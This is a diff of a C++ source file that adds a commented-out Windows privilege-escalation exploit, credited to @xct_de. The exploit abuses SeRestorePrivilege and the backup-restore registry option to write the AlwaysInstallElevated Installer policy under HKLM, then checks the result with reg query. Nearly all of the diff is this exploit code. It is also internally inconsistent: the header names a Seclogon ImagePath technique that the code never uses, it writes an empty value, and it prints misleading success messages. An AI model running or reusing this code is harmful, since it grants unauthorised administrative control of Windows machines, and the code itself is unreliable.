@@ -93,3 +93,57 @@ int main(int argc, char* argv[])
     // check keys
     system("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
 }
+
+/* code that works for rerference
+#include <iostream>
+#include <Windows.h>
+
+
+ Exploit SeRestorePrivilege by modifying Seclogon ImagePath
+ Author: @xct_de
+
+
+int main(int argc, char* argv[])
+{
+    std::string value;
+
+    // create registry key or get handle
+    HKEY hKey;
+    LONG lResult;
+    system("echo trying to make key");
+    lResult = RegCreateKeyExA(
+        HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+        0,
+        NULL,
+        REG_OPTION_BACKUP_RESTORE,
+        KEY_SET_VALUE,
+        NULL,
+        &hKey,
+        NULL);
+    std::cout << "RegCreateKeyExA result: " << lResult << std::endl;
+    if (lResult != 0) {
+        system("echo failed to make key");
+        exit(0);
+    }
+    system("echo Key made");
+
+    // set value
+    lResult = RegSetValueExA(
+        hKey,
+        "AlwaysInstallElevated",
+        0,
+        REG_SZ,
+        reinterpret_cast<const BYTE*>(value.c_str()),
+        value.length() + 1);
+    std::cout << "RegSetValueExA result: " << lResult << std::endl;
+    if (lResult != 0) {
+        system("echo Key value set");
+        exit(0);
+    }
+    system("echo Key made");
+
+    // start service
+    system("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
+}
+*/
